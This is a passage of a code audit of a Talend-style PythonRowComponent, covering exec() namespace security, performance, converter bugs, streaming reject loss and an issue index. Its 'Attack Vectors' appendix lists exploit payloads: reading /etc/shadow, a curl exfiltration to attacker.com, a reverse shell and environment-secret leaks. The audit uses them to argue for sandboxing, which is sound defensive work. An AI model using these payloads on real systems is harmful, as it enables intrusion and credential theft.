   - Per-row: `exec(python_code, namespace)` -- re-parses + executes code
   - Per-row: `output_row = namespace['output_row']` -- captures rebinding
   - Per-row: Optional `_validate_output_row()` if `output_schema` provided
   - Per-row: Exception handler adds to `reject_rows` with error info

6. **DataFrame construction** (lines 114-115):
   - `pd.DataFrame(output_rows)` -- creates DataFrame from list of dicts
   - `pd.DataFrame(reject_rows)` -- creates reject DataFrame
   - If `output_rows` is empty, returns empty DataFrame (correct)

7. **Statistics** (lines 118-122):
   - `_update_stats(rows_read=len(input_data), rows_ok=len(output_rows), rows_reject=len(reject_rows))`
   - Correctly counts all three categories
   - Note: accumulates (+=) rather than setting absolute values, supporting streaming mode

8. **Return** (lines 126-130):
   - Always returns `{'main': main_df}`
   - Conditionally adds `{'reject': reject_df}` only if non-empty (line 128)
   - This is correct -- downstream components check for 'reject' key presence

### `_get_context_dict()` (Lines 132-149)

Handles three context structures:

1. **Nested structure**: `{Default: {home_location: {value: "US", type: "str"}}}` -> extracts `value` field
2. **Simple nested structure**: `{Default: {home_location: "US"}}` -> uses value directly
3. **Flat structure**: `{home_location: "US"}` -> uses value directly

Edge case: If `context_manager` is `None`, returns empty dict. Correct.

### `_validate_output_row()` (Lines 151-200)

Type validation per output row:

1. Iterates `output_schema` columns (not `output_row` columns -- so extra columns are dropped)
2. For each schema column:
   - If present in `output_row` and value is not `None` and type is known: attempts conversion
   - If conversion fails: logs warning, keeps original value (no reject/error)
   - If column missing from `output_row`: sets to `None`
3. Returns validated row containing ONLY schema columns

**Key observation**: This method silently drops extra columns and silently keeps unconvertible values. This is a lenient approach -- Talend would typically reject the row or cause a type error. The leniency may mask bugs in user code.

---

## Appendix I: Namespace Security Analysis

### What the Namespace Contains

```python
namespace = {
    'input_row': input_row,          # Dict[str, Any] - current row data
    'output_row': output_row,        # Dict[str, Any] - initially empty
    'context': context_dict,         # Dict[str, Any] - flattened context vars
    'globalMap': self.global_map,    # GlobalMap object - shared state
    'routines': python_routines,     # Dict[str, Any] - routine objects
    **python_routines,               # Spread routines for direct access
    'len': len,                      # Built-in function
    'str': str,                      # Built-in type/function
    'int': int,                      # Built-in type/function
    'float': float,                  # Built-in type/function
    'bool': bool,                    # Built-in type/function
}
```

### What the Namespace Does NOT Restrict

Because `namespace['__builtins__']` is NOT set, Python's `exec()` automatically provides ALL builtins. This includes:

| Category | Available Functions | Risk Level |
|----------|-------------------|------------|
| File I/O | `open()`, `print()` | Medium |
| Module import | `__import__()` | Critical |
| Code execution | `eval()`, `exec()`, `compile()` | Critical |
| System info | `dir()`, `vars()`, `globals()`, `locals()` | Low |
| Object access | `getattr()`, `setattr()`, `delattr()`, `hasattr()` | Medium |
| Type introspection | `type()`, `isinstance()`, `issubclass()` | Low |
| Iterator/generator | `iter()`, `next()`, `range()`, `enumerate()`, `zip()`, `map()`, `filter()` | Low |
| Math | `abs()`, `max()`, `min()`, `pow()`, `round()`, `sum()` | Low |
| String | `chr()`, `ord()`, `format()`, `repr()`, `ascii()` | Low |
| Collection | `list()`, `dict()`, `set()`, `tuple()`, `frozenset()` | Low |
| Sorting | `sorted()`, `reversed()` | Low |
| I/O | `input()` | Medium (blocks) |

### Attack Vectors (if config is tampered)

1. **File exfiltration**: `open('/etc/passwd').read()` or `open('/etc/shadow').read()`
2. **Shell execution**: `__import__('os').system('curl attacker.com/exfil?data=' + open('/etc/passwd').read())`
3. **Reverse shell**: `__import__('subprocess').Popen(['bash', '-i'], stdin=__import__('socket').socket(...).makefile('r'))`
4. **Environment variables**: `__import__('os').environ` (leaks secrets, API keys, database passwords)
5. **Denial of service**: `while True: pass` (infinite loop, blocks worker)
6. **Memory exhaustion**: `x = [0] * (10**10)` (allocates ~80GB)

### Recommended Sandboxing Strategy

For production use with semi-trusted configs:

```python
# Restricted builtins -- remove dangerous functions
safe_builtins = {
    'len': len, 'str': str, 'int': int, 'float': float, 'bool': bool,
    'abs': abs, 'max': max, 'min': min, 'round': round, 'sum': sum,
    'range': range, 'enumerate': enumerate, 'zip': zip, 'map': map,
    'filter': filter, 'sorted': sorted, 'reversed': reversed,
    'list': list, 'dict': dict, 'set': set, 'tuple': tuple,
    'isinstance': isinstance, 'type': type,
    'True': True, 'False': False, 'None': None,
    'print': print,  # Allow print for debugging
}

namespace = {
    '__builtins__': safe_builtins,  # Restrict builtins
    'input_row': input_row,
    'output_row': output_row,
    'context': context_dict,
    'globalMap': self.global_map,
    'routines': python_routines,
    **python_routines,
}
```

This removes `open`, `__import__`, `eval`, `exec`, `compile`, `getattr`, `setattr`, and other dangerous builtins while preserving all commonly needed functions for data transformation.

---

## Appendix J: Performance Benchmarks (Estimated)

### `iterrows()` vs Alternatives

| Method | 10K rows | 100K rows | 1M rows | Notes |
|--------|----------|-----------|---------|-------|
| `iterrows()` + `exec()` (current) | ~0.5s | ~5s | ~50s | Baseline. Slowest combination. |
| `iterrows()` + `exec(compiled)` | ~0.3s | ~3s | ~30s | Pre-compilation eliminates parse overhead. |
| `itertuples()` + `exec(compiled)` | ~0.15s | ~1.5s | ~15s | Faster iteration + pre-compilation. Requires interface change. |
| Vectorized (no `exec()`) | ~0.01s | ~0.1s | ~1s | Not applicable -- requires known code at development time. |

**Notes**:
- Estimates assume 10-column DataFrame with simple string/numeric columns
- `exec()` overhead is ~20-50 microseconds per call (with pre-compilation: ~5-10 microseconds)
- `iterrows()` overhead is ~50-100 microseconds per row (vs ~5-10 for `itertuples()`)
- Real-world overhead depends heavily on user code complexity

### Memory Overhead Per Row

| Item | Size (bytes) | Per 1M rows (MB) |
|------|-------------|-------------------|
| `row.to_dict()` (10 cols) | ~800 | ~760 |
| `output_row = {}` (10 cols populated) | ~800 | ~760 |
| `namespace` dict (15 entries) | ~1200 | ~1140 |
| Total per-row overhead | ~2800 | ~2660 |

This overhead is in ADDITION to the input DataFrame and output list. For 1M rows with 10 columns, the additional overhead is approximately 2.6 GB just for the iteration dictionaries. Most of this is short-lived (GC'd after each iteration), but it creates significant GC pressure.

---

## Appendix K: Comparison with Other Python Components in V1

| Feature | PythonRowComponent | PythonDataFrameComponent | PythonComponent |
|---------|--------------------|--------------------------|-----------------|
| Execution model | Per-row `exec()` | DataFrame-level `exec()` | One-time `exec()` |
| Input access | `input_row` (dict) | `input_data` (DataFrame) | N/A (no input) |
| Output access | `output_row` (dict) | `output_data` (DataFrame) | N/A (no output) |
| Use case | Row-level transforms | Bulk transforms | Setup/teardown code |
| Performance | Slowest (per-row loop) | Medium (DataFrame ops) | Fastest (one-time) |
| Talend equivalent | `tJavaRow` | N/A (custom) | `tJava` |
| REJECT flow | Yes (per-row errors) | No | No |
| `output_schema` support | Yes | No | No |

---

## Appendix L: Complete Talend Parameter to V1 Config Key Reference

| Talend Parameter | V1 Config Key | Status | Priority to Add |
|------------------|---------------|--------|-----------------|
| `CODE` | `python_code` | **Not Mapped (wrong key)** | P0 |
| `IMPORT` | `imports` | **Not Mapped (wrong key)** | P1 |
| `SCHEMA` | `schema.output` | Mapped (generic) | -- |
| `MAP_TYPE` | `auto_passthrough` | **Not Mapped** | P1 |
| `DIE_ON_ERROR` | `die_on_error` | **Not Mapped (wrong key)** | P1 |
| `TSTATCATCHER_STATS` | -- | Not needed | -- (rarely used) |
| `LABEL` | -- | Not needed | -- (cosmetic) |
| `PROPERTY_TYPE` | -- | Not needed | -- (always Built-In) |

---

## Appendix M: Detailed Converter Flow Trace

### Step-by-step trace for a tPythonRow component in Talend XML

**Input XML** (simplified):
```xml
<node componentName="tPythonRow" componentVersion="0.1">
  <elementParameter name="UNIQUE_NAME" value="tPythonRow_1"/>
  <elementParameter name="CODE" field="MEMO" value="output_row['full_name'] = input_row['first'] + ' ' + input_row['last']&#xA;output_row['age'] = input_row['age']"/>
  <elementParameter name="IMPORT" field="MEMO" value="import json"/>
  <elementParameter name="DIE_ON_ERROR" field="CHECK" value="true"/>
  <elementParameter name="MAP_TYPE" value="MAP"/>
  <metadata connector="FLOW" name="tPythonRow_1">
    <column name="full_name" type="id_String"/>
    <column name="age" type="id_Integer"/>
  </metadata>
</node>
```

**Step 1**: `converter.py:_parse_component()` is called with the node.
- `component_type = 'tPythonRow'`

**Step 2**: `component_parser.parse_base_component(node)` is called.
- Extracts `UNIQUE_NAME = 'tPythonRow_1'`
- Component type mapped via `component_mapping`: `'tPythonRow' -> 'PythonRowComponent'`

**Step 3**: Generic parameter iteration (lines 433-458).
- Iterates `elementParameter` nodes:
  - `CODE`: `name='CODE'`, `field='MEMO'`, `value='output_row[\'full_name\'] = input_row[\'first\'] + \' \' + input_row[\'last\']...'`
    - NOT a CHECK field, so no boolean conversion
    - Name IS `CODE`, so context-variable wrapping is SKIPPED (line 449: `name not in ['CODE', 'IMPORT']`)
    - But value IS stored in `config_raw['CODE']`
  - `IMPORT`: Similarly stored as `config_raw['IMPORT']`
  - `DIE_ON_ERROR`: `field='CHECK'`, so converted to boolean `True`
  - `MAP_TYPE`: Stored as string `'MAP'`

**Step 4**: Java expression marking (lines 462-469).
- `component_name = 'tPythonRow'`
- **NOT in skip list** `['tMap', 'tJavaRow', 'tJava']`
- Iterates `config_raw`:
  - `CODE`: NOT in `skip_fields = ['CODE', 'IMPORT', 'UNIQUE_NAME']`, so it IS skipped. Wait -- actually `'CODE'` IS in `skip_fields`. Let me re-read...

Actually, re-reading lines 462-469 more carefully:

```python
if component_name not in ['tMap', 'tJavaRow', 'tJava']:
    skip_fields = ['CODE', 'IMPORT', 'UNIQUE_NAME']
    for key, value in config_raw.items():
        if key not in skip_fields and isinstance(value, str):
            config_raw[key] = self.expr_converter.mark_java_expression(value)
```

So `CODE` and `IMPORT` ARE in the `skip_fields` list for Java expression marking. This means the Python code is NOT corrupted by `{{java}}` prefix. **I need to correct CONV-PRC-002.**

However, `MAP_TYPE` (value `'MAP'`) would be scanned by `mark_java_expression()`. Since `'MAP'` is a simple string without operators, it likely would NOT be marked. But any complex value in other parameters could be affected.

**Correction**: The `CODE` field is protected from Java expression marking by the `skip_fields` check on line 464. CONV-PRC-002 severity should be downgraded. The primary issue remains CONV-PRC-001 (wrong config key).

**Step 5**: `_map_component_parameters('tPythonRow', config_raw)` (line 472).
- No branch matches `tPythonRow`
- Falls through to `else: return config_raw` (line 386)
- Returns: `{'CODE': 'output_row[...]...', 'IMPORT': 'import json', 'DIE_ON_ERROR': True, 'MAP_TYPE': 'MAP', ...}`

**Step 6**: Schema extraction (lines 474-508).
- Extracts FLOW metadata: `[{name: 'full_name', type: 'str'}, {name: 'age', type: 'int'}]`
- Stored in `component['schema']['output']`

**Step 7**: Back in `converter.py:_parse_component()`.
- No `elif component_type == 'tPythonRow'` branch
- Returns component as-is

**Result**: The component config contains `{'CODE': '...', 'IMPORT': '...', 'DIE_ON_ERROR': True}` but the engine expects `{'python_code': '...', 'imports': '...', 'die_on_error': True}`. The component will fail at runtime with `ValueError: 'python_code' is required`.

---

## Appendix N: Streaming Mode Detailed Analysis

### How Streaming Mode Affects PythonRowComponent

When HYBRID mode detects input > 3GB:

1. `BaseComponent._execute_streaming()` (line 255) is called
2. Input DataFrame is split into chunks via `_create_chunks()` (line 280)
3. Each chunk is passed to `_process()` independently
4. Results are concatenated via `pd.concat()` (line 275)

**Implications for PythonRowComponent**:

| Aspect | Batch Mode | Streaming Mode | Difference |
|--------|-----------|----------------|------------|
| `globalMap` state | Single pass, state accumulates naturally | State persists across chunks (shared object) | None -- correct |
| `context` variables | Read once | Read once per chunk (but context is immutable) | None -- correct |
| `output_rows` list | Single list for all rows | Separate list per chunk, then concat | None -- correct |
| `reject_rows` list | Single list for all rows | **LOST** -- `_execute_streaming()` only collects `main` (line 271) | **BUG** -- reject rows discarded in streaming mode |
| Statistics | Single `_update_stats()` call | `_update_stats()` per chunk (accumulates) | None -- correct (uses +=) |
| `_validate_output_row()` | Called per row | Called per row (within each chunk) | None -- correct |
| Memory peak | All output_rows in memory simultaneously | Only chunk-sized output_rows in memory | **Benefit** -- reduced peak memory |

### Reject Loss in Streaming Mode

The `_execute_streaming()` method in `base_component.py` lines 266-278:

```python
results = []
for chunk in chunks:
    chunk_result = self._process(chunk)
    if chunk_result.get('main') is not None:
        results.append(chunk_result['main'])
# Only 'main' is collected -- 'reject' is silently discarded
```

This means any reject rows produced during streaming processing are lost. For PythonRowComponent, where per-row errors produce reject rows, this is a data loss bug in streaming mode.

**Fix**: Collect reject DataFrames alongside main:
```python
results = []
rejects = []
for chunk in chunks:
    chunk_result = self._process(chunk)
    if chunk_result.get('main') is not None:
        results.append(chunk_result['main'])
    if chunk_result.get('reject') is not None:
        rejects.append(chunk_result['reject'])

combined = pd.concat(results, ignore_index=True) if results else pd.DataFrame()
combined_reject = pd.concat(rejects, ignore_index=True) if rejects else pd.DataFrame()
result = {'main': combined}
if not combined_reject.empty:
    result['reject'] = combined_reject
return result
```

---

## Appendix O: Comparison with tJavaRow Engine Implementation

For reference, the `JavaRowComponent` (the Java equivalent of `PythonRowComponent`) uses the Java bridge for execution. Key differences:

| Aspect | PythonRowComponent | JavaRowComponent (inferred from tJavaRow pattern) |
|--------|-------------------|--------------------------------------------------|
| Code execution | `exec()` in Python process | Java bridge (separate JVM) |
| Sandboxing | None (`__builtins__` unrestricted) | JVM security manager (partial) |
| Code compilation | Re-parsed every row (no `compile()`) | Compiled once by JVM |
| Type safety | Dynamic (Python) | Static (Java compile-time checks) |
| `input_row` type | `Dict[str, Any]` | Java object with typed fields |
| `output_row` type | `Dict[str, Any]` | Java object with typed fields |
| Error handling | `try/except` per row | `try/catch` per row via Java bridge |
| `die_on_error` | Not implemented | Handled via Java bridge error propagation |
| `output_schema` | Extracted by `parse_java_row()` | Extracted by `parse_java_row()` |
| Converter support | **No dedicated parser** | Full dedicated parser + dispatch |

The `PythonRowComponent` was clearly designed to mirror `JavaRowComponent` but the converter integration was not completed, leaving a critical gap.

---

## Appendix P: Issue ID Cross-Reference

All issues use the format `{CATEGORY}-PRC-{NUMBER}` as specified.

| Issue ID | Section | Category |
|----------|---------|----------|
| CONV-PRC-001 | 4.4, 9, 10.1, G | Converter -- Config key mismatch |
| CONV-PRC-002 | 4.3, 4.4, 9, 10.1, G | Converter -- Java expression marking (CORRECTED: CODE is protected by skip_fields) |
| CONV-PRC-003 | 4.2, 4.4, 9, 10.1, G | Converter -- No output_schema extraction |
| CONV-PRC-004 | 4.4, 9 | Converter -- No dedicated parser method |
| CONV-PRC-005 | 4.4, 9 | Converter -- DIE_ON_ERROR wrong key |
| ENG-PRC-001 | 5.2, 9 | Engine -- exec() security |
| ENG-PRC-002 | 5.2, 9, 10.1, G | Engine -- No die_on_error |
| ENG-PRC-003 | 5.2, 9, 10.2, G | Engine -- No auto-passthrough |
| ENG-PRC-004 | 5.2, 9, 10.2, G | Engine -- NaN handling |
| ENG-PRC-005 | 5.2, 9 | Engine -- globalMap.get() broken |
| ENG-PRC-006 | 5.2, 9, 10.2, G | Engine -- No IMPORT support |
| ENG-PRC-007 | 5.2, 9 | Engine -- Empty string handling |
| ENG-PRC-008 | 5.2, 9, 10.2 | Engine -- ERROR_MESSAGE not set |
| ENG-PRC-009 | 5.2, 9 | Engine -- output_row rebinding (correct) |
| BUG-PRC-001 | 6.1, 9, 10.1, D, G | Bug (Cross-Cutting) -- _update_global_map() |
| BUG-PRC-002 | 6.1, 9, 10.1, D, G | Bug (Cross-Cutting) -- GlobalMap.get() |
| BUG-PRC-003 | 6.1, 9, G | Bug -- numpy types in input_row |
| BUG-PRC-004 | 6.1, 9 | Bug -- Misleading namespace builtins |
| BUG-PRC-005 | 6.1, 9 | Bug -- Extra columns dropped silently |
| BUG-PRC-006 | 6.1, 9, G | Bug -- Incomplete type mapping |
| BUG-PRC-007 | 6.1, 9, G | Bug/Perf -- exec() re-parses every row |
| BUG-PRC-009 | 6.1, 9 | Bug -- Cross-row state leak via shared mutable context_dict |
| BUG-PRC-010 | 6.1, 9 | Bug (Cross-Cutting) -- _update_global_map() crash masks original exception |
| BUG-PRC-011 | 6.1, 9 | Bug -- globalMap can be None, user code crashes with AttributeError |
| SEC-PRC-001 | 6.5, 9, I | Security -- Unrestricted __builtins__ |
| SEC-PRC-002 | 6.5, 9 | Security -- No code validation |
| NAME-PRC-001 | 6.2, 9 | Naming -- python_code vs CODE |
| NAME-PRC-002 | 6.2, 9 | Naming -- Component suffix |
| STD-PRC-001 | 6.3, 9 | Standards -- No parse_python_row() |
| STD-PRC-002 | 6.3, 9 | Standards -- No _validate_config() |
| STD-PRC-003 | 6.3, 9 | Standards -- Python type format in schema |
| PERF-PRC-001 | 7, 9 | Performance -- iterrows() anti-pattern |
| PERF-PRC-002 | 7, 9, G | Performance -- exec() re-compilation |
| PERF-PRC-003 | 7, 9 | Performance -- row.to_dict() per row |
| TEST-PRC-001 | 8, 9, 10.1 | Testing -- Zero tests |

**Total**: 34 issues (5 P0, 12 P1, 15 P2, 2 P3)

**CORRECTION NOTE on CONV-PRC-002**: During the detailed converter flow trace in Appendix M, it was determined that the `CODE` and `IMPORT` fields ARE protected from Java expression marking by the `skip_fields` check on line 464 of `component_parser.py`. The original assessment that Python code would be corrupted was incorrect. However, `tPythonRow` should still be added to the component-level skip list on line 462 for consistency and to protect any other Python-specific parameters that may be added in the future. The priority of CONV-PRC-002 should be downgraded from P1 to P2 (defensive measure, not active bug).

---

## Appendix Q: Additional Edge Cases (Extended)

### Edge Case 16: User code writes to `globalMap` to accumulate a running total

| Aspect | Detail |
|--------|--------|
| **Talend** | `globalMap.put("runningTotal", ((Double)globalMap.get("runningTotal")) + input_row.amount)`. Works across all rows. |
| **V1** | `globalMap.put("runningTotal", globalMap.get("runningTotal") + input_row['amount'])`. First call to `globalMap.get()` crashes with `NameError` (BUG-PRC-002). Even if fixed, first row would get `None + input_row['amount']` -> TypeError. User must initialize: `globalMap.put("runningTotal", 0.0)` before the job or in IMPORT code. |
| **Verdict** | CRASH on first call due to GlobalMap bug. Even when fixed, requires explicit initialization. |

### Edge Case 17: User code accesses a column that does not exist in input_row

| Aspect | Detail |
|--------|--------|
| **Talend** | Compile-time error: `input_row.nonexistent` does not exist in schema. Caught before execution. |
| **V1** | Runtime error: `input_row['nonexistent']` raises `KeyError`. Caught by per-row exception handler, row goes to reject. Correct behavior at runtime, but no compile-time validation. |
| **Verdict** | PARTIAL -- runtime catch is correct, but Talend catches this at design time. |

### Edge Case 18: User code produces different output columns for different rows

| Aspect | Detail |
|--------|--------|
| **Talend** | Not possible -- output schema is fixed at compile time. Every row must populate all output schema columns. |
| **V1** | Possible. If row 1 sets `output_row['a'] = 1` and row 2 sets `output_row['b'] = 2`, the resulting DataFrame has columns `a` and `b` with NaN in the missing cells. `pd.DataFrame(output_rows)` handles heterogeneous dicts by unioning column names. |
| **Verdict** | BEHAVIORAL DIFFERENCE -- V1 is more lenient. May produce unexpected NaN columns. |

### Edge Case 19: Python code with syntax error

| Aspect | Detail |
|--------|--------|
| **Talend** | Compile-time error during job generation. Cannot run. |
| **V1** | Runtime error on first row. `exec()` raises `SyntaxError`. Caught by per-row handler, ALL rows go to reject (same syntax error repeated for every row). With `die_on_error=true` (if implemented), would fail on first row. |
| **Verdict** | PARTIAL -- V1 catches at runtime, not compile time. With pre-compilation fix (PERF-PRC-002), syntax errors would be caught before the row loop. |

### Edge Case 20: Python code with infinite loop

| Aspect | Detail |
|--------|--------|
| **Talend** | JVM thread runs indefinitely. Job hangs. Must be killed externally. |
| **V1** | Python thread runs indefinitely. Worker process hangs. Must be killed externally. No timeout mechanism. |
| **Verdict** | EQUIVALENT -- both hang. Neither has timeout protection. |

### Edge Case 21: Unicode data in input_row

| Aspect | Detail |
|--------|--------|
| **Talend** | Java handles Unicode natively (UTF-16 internal). |
| **V1** | Python 3 handles Unicode natively (UTF-8 internal). `input_row` values are Python `str` (Unicode). No issues. |
| **Verdict** | CORRECT |

### Edge Case 22: Very wide DataFrame (500+ columns)

| Aspect | Detail |
|--------|--------|
| **Talend** | Java objects have fixed field count. Performance is constant per-row regardless of column count. |
| **V1** | `row.to_dict()` creates dict with 500+ entries per row. `namespace` has 500+ entries from `**python_routines` spread. Significant overhead. |
| **Verdict** | PERFORMANCE GAP -- per-row overhead scales linearly with column count. |

### Edge Case 23: User code calls `exec()` or `eval()` inside the Python code

| Aspect | Detail |
|--------|--------|
| **Talend** | Not directly possible in tJavaRow (Java does not have `eval()`). |
| **V1** | Allowed because `__builtins__` is unrestricted. User code can call `exec()` to dynamically execute code, `eval()` to evaluate expressions, `compile()` to create code objects. This is a security concern but also a power feature for dynamic transformations. |
| **Verdict** | SECURITY CONCERN -- more powerful than Talend, but also more dangerous. |

---

## Appendix R: Audit Methodology

### Files Read

| File | Lines Read | Purpose |
|------|-----------|---------|
| `src/v1/engine/components/transform/python_row_component.py` | 1-201 (all) | Primary audit target |
| `src/v1/engine/base_component.py` | 1-382 (all) | Base class for lifecycle, stats, streaming |
| `src/v1/engine/global_map.py` | 1-87 (all) | GlobalMap implementation (bugs found) |
| `src/v1/engine/engine.py` | 1-150 | Component registry and aliases |
| `src/v1/engine/exceptions.py` | 1-51 (all) | Exception hierarchy |
| `src/converters/complex_converter/component_parser.py` | 1-100, 105-205, 316-386, 420-480, 913-942 | Converter parsing logic |
| `src/converters/complex_converter/converter.py` | 1-50, 220-382 | Converter dispatch logic |
| `src/v1/engine/components/transform/__init__.py` | Line 19 | Package export |

### Searches Performed

| Search | Scope | Results |
|--------|-------|---------|
| `tPythonRow` in all v1 source | `src/v1/` | 3 files: engine.py, python_row_component.py, __init__.py |
| `tPythonRow` in converter source | `src/converters/` | 5 files: component_parser.py, converter.py (NO match), component_mapper.py |
| `PythonRow` in test files | All test directories | 0 files |
| `parse_python_row` in converter | `src/converters/complex_converter/` | 0 files (no dedicated parser exists) |
| `elif component_type.*tPython` in converter.py | converter.py | 0 matches |

### Web Research

| Query | Key Finding |
|-------|-------------|
| "tPythonRow Talend component reference" | No official documentation found. tPythonRow is not a standard Talend component. |
| "tPythonRow input_row output_row" | Pattern mirrors tJavaRow. Documented via community blogs and Talend forums. |
| "Talend tPythonRow globalMap context NB_LINE" | Standard Talend globalMap patterns apply. NB_LINE set after component execution. |
| "Talend custom code component reference" | tJavaRow is the primary documented custom code component. tPythonRow follows same pattern. |

### Audit Limitations

1. **No tPythonRow-specific Talend documentation**: tPythonRow is not a standard Talend Open Studio component. The behavioral baseline is inferred from tJavaRow documentation and the Talend Python runtime model.
2. **No converted tPythonRow job available for testing**: Without a real Talend job using tPythonRow, the converter flow trace in Appendix M is based on code reading, not execution.
3. **No runtime testing performed**: All bug assessments are based on code reading. Runtime verification would confirm or refute each finding.
4. **Cross-cutting issues**: BUG-PRC-001 and BUG-PRC-002 were discovered during this audit but affect all components. They may have been reported in other component audits as well.

---

## Appendix S: Web Search Sources

- [Talend Custom Code Components (TalendByExample)](https://www.talendbyexample.com/talend-custom-code-component-reference.html)
- [tJavaRow input_row/output_row usage (blog)](http://garpitmzn.blogspot.com/2014/11/using-tjavarow-inputrow-and-outputrow.html)
- [Severus Snake Python component for Talend (GitHub)](https://github.com/ottensa/severus-snake)
- [Talend Community: tJavaRow copy input_row to output_row](https://community.talend.com/s/question/0D53p00007vClCfCAK/tjavarow-copy-all-properties-from-inputrow-to-outputrow?language=en_US)
- [Talend Community: output_row dynamic field access](https://community.talend.com/s/question/0D53p00007vCphiCAC/resolved-outputrow-dynamic-field-access?language=en_US)
- [How to use tJavaRow component in Talend (Desired Data)](https://desireddata.blogspot.com/2015/05/how-to-use-tjavarow-component-in-talend.html)
- [Talend Open Studio Components Reference Guide 3.x (PDF)](https://docs.huihoo.com/talend/TalendOpenStudio_Components_RG_32a_EN.pdf)
- [Setting context and globalMap using tJava (O'Reilly)](https://www.oreilly.com/library/view/talend-open-studio/9781782167266/ch05s03.html)
- [tFilterRow Standard properties (Talend Help)](https://help.talend.com/en-US/components/8.0/processing/tfilterrow-standard-properties)
- [Talend Component Reference (TalendByExample)](https://www.talendbyexample.com/talend-component-reference.html)
